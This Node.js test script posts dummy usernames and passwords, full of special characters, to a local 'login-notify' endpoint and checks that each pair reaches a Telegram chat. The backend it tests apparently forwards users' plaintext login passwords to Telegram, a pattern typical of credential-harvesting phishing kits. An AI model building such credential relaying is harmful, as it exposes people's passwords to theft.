/**
 * Test script to verify Telegram notifications work with special characters
 * Run this with: node test-special-chars.js
 */

const fetch = require('node-fetch');

const API_URL = 'http://localhost:3001/api/login-notify';

// Test cases with various special characters
const testCases = [
  {
    name: 'Simple username',
    username: 'chandan',
    password: 'password123'
  },
  {
    name: 'Username with underscores',
    username: 'chandan_6_0_5',
    password: 'test_pass_123'
  },
  {
    name: 'Username with backticks',
    username: 'user`test`123',
    password: 'pass`word'
  },
  {
    name: 'Username with asterisks',
    username: 'user*star*123',
    password: 'my*pass*word'
  },
  {
    name: 'Username with brackets',
    username: 'user[test]123',
    password: 'pass(word)'
  },
  {
    name: 'Username with hyphens and dots',
    username: 'user-name.test',
    password: 'pass-word.123'
  },
  {
    name: 'Username with special chars',
    username: 'test_user-123.name',
    password: 'P@$$w0rd!#$'
  },
  {
    name: 'Email as username',
    username: 'user@example.com',
    password: 'complex_P@ss123!'
  },
  {
    name: 'All special characters',
    username: 'a_b*c[d]e(f)g~h`i>j+k-l=m|n{o}p.q!r',
    password: 's_t*u[v]w(x)y~z`0>1+2-3=4|5{6}7.8!9'
  }
];

async function testLogin(testCase) {
  console.log(`\n🧪 Testing: ${testCase.name}`);
  console.log(`   Username: ${testCase.username}`);
  console.log(`   Password: ${testCase.password}`);

  try {
    const response = await fetch(API_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        username: testCase.username,
        password: testCase.password,
        timestamp: new Date().toISOString(),
      }),
    });

    const data = await response.json();

    if (response.ok && data.success) {
      console.log(`   ✅ SUCCESS - Message sent to Telegram`);
    } else {
      console.log(`   ❌ FAILED - ${data.error || 'Unknown error'}`);
    }
  } catch (error) {
    console.log(`   ❌ ERROR - ${error.message}`);
  }

  // Wait 1 second between tests to avoid rate limiting
  await new Promise(resolve => setTimeout(resolve, 1000));
}

async function runAllTests() {
  console.log('🚀 Starting Special Character Tests');
  console.log('=' .repeat(50));

  // Check if server is running
  try {
    const healthCheck = await fetch('http://localhost:3001/health');
    if (!healthCheck.ok) {
      throw new Error('Server not responding');
    }
    console.log('✅ Backend server is running\n');
  } catch (error) {
    console.error('❌ Backend server is not running!');
    console.error('Start it with: npm run server\n');
    process.exit(1);
  }

  // Run all test cases
  for (const testCase of testCases) {
    await testLogin(testCase);
  }

  console.log('\n' + '='.repeat(50));
  console.log('🎉 All tests completed!');
  console.log('Check your Telegram for the messages.');
}

// Run tests
runAllTests().catch(error => {
  console.error('Fatal error:', error);
  process.exit(1);
});
